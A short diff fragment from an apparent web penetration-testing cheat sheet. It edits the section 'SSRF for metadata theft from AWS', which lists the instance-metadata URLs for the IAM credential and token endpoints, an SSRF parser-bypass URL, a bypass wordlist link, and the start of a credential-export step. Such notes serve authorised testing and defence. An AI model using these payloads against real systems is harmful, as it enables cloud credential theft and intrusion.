@@ -1410,11 +1410,13 @@ http://127.1.1.1:80#\@127.2.2.2:80/
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/ssrf_local_bypass.txt
 
 ### SSRF for metadata theft from AWS
-http://169.254.169.254/latest/api/token 
+
 -> target
 ```
 http://169.254.169.254/latest/meta-data/iam/security-credentials/<iam-role>
+http://169.254.169.254/latest/api/token 
 ```
+
 -> Export credentials
 ```
 export AWS_ACCESS_KEY_ID=<access_key_id>   
